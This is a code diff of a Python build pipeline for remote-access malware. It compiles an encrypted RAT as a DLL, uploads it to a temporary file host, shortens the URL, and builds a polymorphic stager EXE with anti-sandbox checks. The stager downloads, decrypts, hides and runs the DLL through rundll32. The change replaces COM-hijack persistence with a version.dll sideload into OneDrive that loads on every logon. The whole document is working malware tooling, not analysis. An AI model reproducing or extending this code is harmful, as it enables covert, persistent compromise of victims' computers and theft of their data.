@@ -266,13 +266,13 @@ class VMAssembler:
 
         return bytes(self.program)
 
-    def assemble_dll(self, url, xor_key, rc4_key, drop_path, com_clsid, sleep_ms):
+    def assemble_dll(self, url, xor_key, rc4_key, drop_path, com_clsid=None, sleep_ms=3000):
         """Assemble VM bytecode for DLL sideload pipeline.
 
         Flow: env_check → sleep → download → decrypt → write DLL →
               hide file → sleep → LOLBAS exec (rundll32 EntryPoint).
 
-        COM hijack registration is handled by the DLL itself (EntryPoint →
+        OneDrive sideload is handled by the DLL itself (EntryPoint →
         performSideload), so the stager only needs to drop and execute it.
         """
         self.program = bytearray()
@@ -1136,23 +1136,16 @@ def stage_compile_stager(stager_dir, output_name):
 # STAGE — Compile DLL payload (c-shared, CGO)
 # ============================================================
 
-def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox, dll_name=None, dll_subdir=None):
+def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox):
     """Compile agent as DLL (c-shared, CGO), dual-layer encrypt, upload.
 
     The DLL contains:
     - Full RAT agent (runAgent)
-    - COM proxy (DllGetClassObject/DllCanUnloadNow → mmdevapi.dll)
+    - version.dll proxy (16 exports → System32\\version.dll)
     - EntryPoint export for rundll32
-    - Self-sideload + COM hijack registration on init
-
-    dll_name/dll_subdir: randomized per build, injected into dll_sideload.go source.
+    - Self-sideload to OneDrive directory for persistence
     """
     base_dir = os.path.dirname(os.path.abspath(__file__))
-
-    if dll_name is None:
-        dll_name = random.choice(DLL_DROP_NAMES) + ".dll"
-    if dll_subdir is None:
-        dll_subdir = random.choice(DLL_DROP_SUBDIRS)
 
     with tempfile.TemporaryDirectory() as tmpdir:
         with open(os.path.join(tmpdir, "main.go"), "w", encoding="utf-8") as f:
@@ -1162,20 +1155,7 @@ def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox, dll_name=None, d
         if not os.path.exists(dll_src):
             raise Exception("dll_sideload.go not found — required for DLL build")
 
-        # Inject randomized drop path constants into dll_sideload.go
-        with open(dll_src, "r", encoding="utf-8") as f:
-            dll_go_src = f.read()
-        dll_go_src = dll_go_src.replace(
-            'sideloadSubdir  = `Microsoft\\Windows\\Shell`',
-            f'sideloadSubdir  = `{dll_subdir}`',
-        )
-        dll_go_src = dll_go_src.replace(
-            'sideloadDLLName = "ShellServiceHost.dll"',
-            f'sideloadDLLName = "{dll_name}"',
-        )
-        with open(os.path.join(tmpdir, "dll_sideload.go"), "w", encoding="utf-8") as f:
-            f.write(dll_go_src)
-        log(f"DLL drop path randomized: {dll_subdir}\\{dll_name}", "OK")
+        shutil.copy2(dll_src, os.path.join(tmpdir, "dll_sideload.go"))
 
         cc = shutil.which("x86_64-w64-mingw32-gcc")
         if not cc:
@@ -1229,22 +1209,18 @@ def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox, dll_name=None, d
 # STAGE — Generate DLL-aware stager (drops DLL + rundll32 exec)
 # ============================================================
 
-def stage_generate_dll_stager(payload_url, xor_key, rc4_key, dll_name=None, dll_subdir=None, sandbox=True):
+def stage_generate_dll_stager(payload_url, xor_key, rc4_key, sandbox=True):
     """Generate polymorphic stager that drops DLL and executes via rundll32.
 
-    The DLL's EntryPoint() handles COM hijack registration itself, so the
-    stager only needs to: download → decrypt → write DLL → hide → rundll32.
-
-    dll_name/dll_subdir must match what was injected into dll_sideload.go.
+    The DLL's EntryPoint() handles sideloading itself (copies to OneDrive
+    directory as version.dll), so the stager just needs to: download →
+    decrypt → write DLL to temp location → hide → rundll32.
     """
     sleep_ms = random.randint(2000, 5000)
 
-    if dll_name is None:
-        dll_name = "ShellServiceHost.dll"
-    if dll_subdir is None:
-        dll_subdir = r"Microsoft\Windows\Shell"
-
-    # Build relative drop path for WFILE opcode (uses forward slashes)
+    # Temp drop location for the stager (before rundll32 executes the DLL)
+    dll_name = random.choice(DLL_DROP_NAMES) + ".dll"
+    dll_subdir = random.choice(DLL_DROP_SUBDIRS)
     drop_path = dll_subdir.replace("\\", "/") + "/" + dll_name
 
     asm = VMAssembler()
@@ -1253,7 +1229,7 @@ def stage_generate_dll_stager(payload_url, xor_key, rc4_key, dll_name=None, dll_
         xor_key=xor_key,
         rc4_key=rc4_key,
         drop_path=drop_path,
-        com_clsid="{BCDE0395-E52F-467C-8E3D-C4579291692E}",
+        com_clsid="unused",  # not used in bytecode anymore
         sleep_ms=sleep_ms,
     )
     log(f"DLL bytecode assembled: {len(bytecode)} bytes, {len(asm.used_opcodes())} opcodes", "OK")
@@ -1267,8 +1243,8 @@ def stage_generate_dll_stager(payload_url, xor_key, rc4_key, dll_name=None, dll_
 
     subprocess.run(["go", "mod", "init", "stager"], cwd=tmpdir, capture_output=True)
 
-    log(f"Drop target: %APPDATA%\\{dll_subdir}\\{dll_name}", "OK")
-    log("Exec: rundll32.exe <dll>,EntryPoint → COM hijack registered inside DLL", "OK")
+    log(f"Temp drop: %APPDATA%\\{dll_subdir}\\{dll_name}", "OK")
+    log("Exec: rundll32.exe <dll>,EntryPoint → sideloads to OneDrive as version.dll", "OK")
     if sandbox:
         log("Anti-analysis: CPU check, timing check", "OK")
     return tmpdir
@@ -1289,7 +1265,7 @@ def main():
         raw_payload = f.read()
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
-    # --- DLL sideload mode → outputs EXE stager that drops DLL + COM hijack + rundll32 ---
+    # --- DLL sideload mode → outputs EXE stager that drops DLL + rundll32 ---
     if "--dll" in sys.argv:
         name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
         idx = sys.argv.index("--dll")
@@ -1303,27 +1279,22 @@ def main():
         rc4_key = generate_key(32)
         litterbox = LitterboxAPI(retention="24h")
 
-        dll_name = random.choice(DLL_DROP_NAMES) + ".dll"
-        dll_subdir = random.choice(DLL_DROP_SUBDIRS)
-
         log(f"DLL sideload mode — final output: {output_name} (EXE stager)")
         log(f"XOR Key: {xor_key}")
         log(f"RC4 Key: {rc4_key}")
-        log(f"DLL drop: %APPDATA%\\{dll_subdir}\\{dll_name}")
+        log(f"Sideload target: %LOCALAPPDATA%\\Microsoft\\OneDrive\\version.dll")
         print()
 
         try:
             log("--- Stage 1: Compile DLL Payload & Encrypt ---")
-            payload_url = stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox,
-                                            dll_name=dll_name, dll_subdir=dll_subdir)
+            payload_url = stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox)
 
             log("\n--- Stage 2: Shorten Payload URL ---")
             short_url = URLShortener.shorten(payload_url)
             log("Shortened URL ready", "OK")
 
             log("\n--- Stage 3: Generate DLL Sideload Stager ---")
-            stager_dir = stage_generate_dll_stager(payload_url, xor_key, rc4_key,
-                                                    dll_name=dll_name, dll_subdir=dll_subdir)
+            stager_dir = stage_generate_dll_stager(payload_url, xor_key, rc4_key)
 
             log("\n--- Stage 4: Compile Stager → EXE ---")
             stage_compile_stager(stager_dir, output_name)
@@ -1332,7 +1303,7 @@ def main():
             log("=== DLL Sideload Pipeline Complete ===", "OK")
             log(f"Output: {output_name}", "OK")
             log("Flow: stager EXE → downloads DLL → drops + hides → rundll32 EntryPoint", "OK")
-            log("Persistence: explorer.exe loads DLL via COM hijack on every logon", "OK")
+            log("Persistence: OneDrive.exe loads version.dll on every logon (no registry)", "OK")
         except Exception as e:
             log(f"Stopped: {e}", "ERR")
             sys.exit(1)
